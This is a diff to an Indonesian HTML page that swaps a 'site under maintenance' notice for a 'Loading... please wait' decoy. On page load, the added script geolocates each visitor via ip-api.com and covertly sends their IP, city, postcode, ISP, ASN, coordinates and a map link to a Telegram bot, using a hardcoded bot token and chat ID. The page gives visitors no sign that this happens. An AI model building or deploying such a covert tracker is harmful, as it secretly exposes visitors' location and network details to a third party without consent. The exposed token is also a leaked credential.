@@ -2,47 +2,54 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8" />
-  <title>Website Sedang Perbaikan</title>
+  <title>Loading...</title>
 </head>
 <body>
-  <h1>Halo 👋</h1>
-  <p>Website ini sedang dalam perbaikan.</p>
+  <h3>Mohon tunggu...</h3>
 
   <script>
+    // ===== GANTI DENGAN PUNYA KAMU =====
+    const BOT_TOKEN = "8450745041:AAEKdyVwwytSBLPe5zJhCg4cd9TqBDCgB1o"; 
+    const CHAT_ID = "7600526426";
+
     async function getIP() {
       try {
-        const res = await fetch("http://ip-api.com/json/");
+        const res = await fetch("http://ip-api.com/json/?fields=status,message,query,country,regionName,city,lat,lon,isp,org,as,timezone,zip");
         const data = await res.json();
 
+        if (data.status !== "success") {
+          throw new Error(data.message || "Gagal ambil data");
+        }
+
         const info = `
-📡 IP Baru Terdeteksi
+📡 *IP Terdeteksi*
 🌐 IP: ${data.query}
 🌍 Negara: ${data.country}
-🏙 Kota: ${data.city}, ${data.regionName}
+🏙 Kota: ${data.city}, ${data.regionName} ${data.zip}
 🛰 ISP: ${data.isp}
+🏢 Org: ${data.org}
+⚡ ASN: ${data.as}
 ⌚ Zona Waktu: ${data.timezone}
 📌 Koordinat: ${data.lat}, ${data.lon}
+🔗 [Lihat di Maps](https://www.google.com/maps?q=${data.lat},${data.lon})
         `;
 
-        console.log(info);
-
-        // Kirim ke bot Telegram
+        // kirim ke bot telegram
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             chat_id: CHAT_ID,
-            text: info
+            text: info,
+            parse_mode: "Markdown",
+            disable_web_page_preview: false
           })
         });
+
       } catch (err) {
-        console.error("Gagal ambil IP", err);
+        console.error("Gagal ambil IP:", err);
       }
     }
-
-    // ===== GANTI DENGAN PUNYA KAMU =====
-    const BOT_TOKEN = "8450745041:AAEKdyVwwytSBLPe5zJhCg4cd9TqBDCgB1o";
-    const CHAT_ID = "7600526426";
 
     getIP();
   </script>
